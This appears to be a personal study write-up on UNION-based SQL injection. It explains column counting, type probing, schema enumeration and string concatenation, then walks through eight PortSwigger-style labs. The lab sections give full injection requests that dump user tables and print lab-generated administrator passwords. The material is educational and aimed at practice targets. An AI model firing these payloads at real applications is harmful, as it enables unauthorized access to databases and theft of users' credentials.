# Union SQL Injection

## Data from other tables

To retrieve data from other database tables, we can use the `UNION` keyword.

> For a UNION query to work, two key requirements must be met:
>
> - The individual queries must return the same number of columns.
> - The data types in each column must be compatible between the individual queries.

To get the number of columns, you have two options:

- you can use `ORDER BY n`, where `n` is a number between 1 and the number of columns returned (so just increment it until you get an error)
- you can use `UNION SELECT NULL,NULL,NULL`, with an arbitrary number of `NULL` value used

> Why use the `NULL` value?

Because it is convertible to every commonly used data type, so we won't (probably) get errors caused by incompatible data types.

Also note that:

> On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called DUAL which can be used for this purpose. So the injected queries on Oracle would need to look like: ' UNION SELECT NULL FROM DUAL--.
>
> On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.

Following is an example of a Union SQLi:

```sql
-- suppose the original query is
-- HTTP request: GET /products?category=Watches
SELECT product_id, title FROM products WHERE category='Watches'

-- forge a UNION SQLi
-- HTTP request: GET /products?category=Watches'+UNION+SELECT+username
SELECT product_id, title FROM products WHERE category='Watches' UNION SELECT username, passwd FROM users--' 
```

> What about Oracle databases? All SELECT queries must use the FROM keyword a specify a valid table

You can use the (in-built) `DUAL` table, e.g.:

```sql
SELECT username, passwd FROM users UNION SELECT NULL,NULL FROM DUAL--
```

### Information schema

Most databases (made exception for Oracle) have a set of views called the `information schema` which provide information about the database.

First example: retrieve the names of the tables.

```sql
SELECT * FROM information_schema.tables
```

The output should be similar the following table:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ---------- |
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |

Second example: retrieve the names of the columns.

```sql
SELECT * FROM information_schema.columns
```

The output should be similar the following table:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
| ------------- | ------------ | ---------- | ----------- | --------- |
| MyDatabase    | dbo          | Users      | UserId      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |

As I mentioned before, Oracle databases differ (as regards the location of the information schema).

```sql
-- list tables
-- https://docs.oracle.com/cd/B28359_01/server.111/b28320/statviews_2105.htm#REFRN20286
-- see the link above to see all the columns
SELECT * FROM all_tables

-- list columns by querying all_tab_columns:
-- https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2094.htm
-- see the link above to see all the columns

SELECT * FROM all_tab_columns WHERE table_name = 'USERS' 
```

## Finding columns with a useful data type

Based on the number of columns, you can select a `NULL` value with, for example, a string or an integer, in order to test the data type (if it doesn't return an error it means is should be correct).

```txt
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'-- 
```

## String concatenation

If the query returns only 1 column, you can retrieve multiple values together withing a single column by concatenating the values together.

Different databases use different techniques for string concatenation:

| Database   | Technique                                                                     |
| ---------- | ----------------------------------------------------------------------------- |
| Oracle     | 'foo'\|\|'bar'                                                                |
| Microsoft  | 'foo'+'bar'                                                                   |
| PostgreSQL | 'foo'\|\|'bar'                                                                |
| MySQL      | 'foo' 'bar' [Note the space between the two strings]                          |
|            | CONCAT('foo','bar')                                                           |

If you need to concatenate table columns (e.g. `table.foo` and `table.bar`), then you'll have to drop the apostrofe character, like this (in the case of a PostgreSQL database): foo||bar.

If you want to add a separator between the two strings, you can copy this syntax:

```txt
' UNION SELECT username || '~' || password FROM users-- 
```

Pay attention to the number of double vertical bars (`|`). For example, if you use two separators (column1,separator,column2,separator,column3), there are going to be `8` vertical bars.

## Labs

### Lab 1

> SQL injection UNION attack, determining the number of columns returned by the query

Using the first method (`ORDER BY`), I found out that the number of columns is 3.

To finish the lab I needed to use the second method (`UNION SELECT NULL...`). In particular, I send the following HTTP request:

```http
GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
# output omitted for brevity
```

### Lab 2

> SQL injection UNION attack, finding a column containing text

I had to find which columns accepted a string (spoiler: the second column), and then return the value `InZuic` in one column.

To do this, I used the following HTTP request:

```http
GET /filter?category=Accessories'+UNION+SELECT+NULL,'InZuic',NULL-- HTTP/1.1
```

### Lab 3

> SQL injection UNION attack, retrieving data from other tables

I had to use the previous technique. However, instead of adding `NULL` values, I had to retrieve columns from another table, named `users`.

To do this, I used the following HTTP request:

```htpp
GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
```

Once I got the usernames, and the corresponding passwords, I could log in as the user `administrator` (password: `pctpvrt1enp3ro5r25eb`).

### Lab 4

> SQL injection attack, querying the database type and version on Oracle

Since I had to "[...] display the database version string", I started with the following request:

```http
GET /filter?category=Pets'+ORDER+BY+2-- HTTP/1.1
```

Since I found out that the query extracts two columns, I tried using an UNION SQLi:

```http
GET /filter?category=Pets'+UNION+SELECT+NULL,NULL+FROM+DUAL-- HTTP/1.1
```

Initially, I wasn't using `FROM DUAL` (I didn't read the last part about the database being an Oracle one), so I was receiving HTTP 500s (Internal Server Error). After adding `FROM DUAL`, I was getting again HTTP 200s.

The overview page contains a table in the section `Examining the database`, where states that you must use `SELECT * FROM v$version;` for Oracle databases.

In particular, this table has only one column, named `Banner`. Consequently, I crafted this request:

```http
GET /filter?category=Pets'+UNION+SELECT+Banner,NULL+FROM+v$version-- HTTP/1.1
```

According to [this page](https://portswigger.net/web-security/sql-injection/cheat-sheet) I could also use `SELECT version FROM v$instance`.

### Lab 5

The lab is akin to the previous one, however I couldn't use `--` to comment the rest of the query (since it's probably a MySQL database). I found out I could use `#` instead (or `--+`, since `+` represents a space).

```http
GET /filter?category=Gifts'ORDER+BY+2--+ HTTP/1.1
```

Alternatively, this one:

```http
GET /filter?category=Gifts'ORDER+BY+2# HTTP/1.1
```

As you can see, there are two columns. To get the version I followed the same [cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), which states that I should use `SELECT @@version` to get the version of the database (this is true for MySQL, and Microsoft databases).

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,@@version--+ HTTP/1.1
```

### Lab 6

> SQL injection attack, listing the database contents on non-Oracle databases

With the `ORDER BY` method I found out that the query retrieves only two columns.

Since I didn't know the name of the table containing all the users, I tried using the GET request:

```http
GET /filter?category=Accessories'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables-- HTTP/1.1
```

Which returned a pretty long list of tables. Among them, there was one named `users_nasavc`, which should be the table needed. I still didn't know the name of the columns though. To retrieve them, I used the following request:

```http
GET /filter?category=Accessories'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+TABLE_NAME='users_nasavc'-- HTTP/1.1
```

I got the following columns:

- `username_kdfgxz`
- `password_luvdsv`

Finally, I retrieved the usernames and password with below request:

```http
GET /filter?category=Accessories'+UNION+SELECT+username_kdfgxz,password_luvdsv+FROM+users_nasavc-- HTTP/1.1
```

| username_kdfgxz | password_luvdsv      |
| --------------- | -------------------- |
| administrator   | p69iz8xwhbad22ks619p |
| carlos          | a4kqlobrlemxo4h7bkvd |
| wiener          | 1rkwle6yx0yzrn8l5lpj |

All I needed to do now was to login with administrator's credentials.

### Lab 7

> SQL injection attack, listing the database contents on Oracle

With the `ORDER BY` method I found out that the query retrieves only two columns.

Since I didn't know the name of the table containing all the users, I tried retrieving information from the table `all_tables`:

```http
GET /filter?category=Pets'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables-- HTTP/1.1
```

Searching through the results, I found an interesting table named `USERS_VCJWBZ`. To find the columns:

```http
GET /filter?category=Pets'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+TABLE_NAME='USERS_VCJWBZ'-- HTTP/1.1
```

So the columns are:

- `PASSWORD_QCKANR`
- `USERNAME_ACJIQT`

Then I retrieved the data from this table:

```http
GET /filter?category=Pets'+UNION+SELECT+USERNAME_ACJIQT,PASSWORD_QCKANR+FROM+USERS_VCJWBZ-- HTTP/1.1
```

| username_kdfgxz | password_luvdsv      |
| --------------- | -------------------- |
| administrator   | xejluufjocnurb4s9ui6 |
| carlos          | 8w02f7jxhsqx8m6g4ds0 |
| wiener          | 3shbybylv5pj7c1lpgrn |

Finally, I logged in with administrator's credentials.

### Lab 8

> SQL injection UNION attack, retrieving multiple values in a single column

The procedure is akin to the previous lab, since the number of columns is `2`. I was reminded (by the solution) to also check the types of the data retrieved.

Replacing `NULL` with different data type (`'a'` or `1`), I found out that the types are: `int` and `string`. However, I still didn't know the version of the database.

It wasn't an Oracle database, since `FROM DUAL` wasn't needed. Also, it wasn't a MySQL database, since I couldn't use `#` for commenting out the rest of the query.

I got the version using `SELECT version()`. I turned out to be a `PostgreSQL` database:

```txt
PostgreSQL 11.2 (Debian 11.2-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit.
```

The string concatenation method on PostgreSQL databases is based on the following technique: `'foo'||'bar'`, or `'foo'||'-----'||'bar'` when you want a separator (as in my case).

Finally, to get the credentials, I used the GET request below:

```http
GET /filter?category=Pets'+UNION+SELECT+1,username||'---'||password+FROM+users-- HTTP/1.1
```

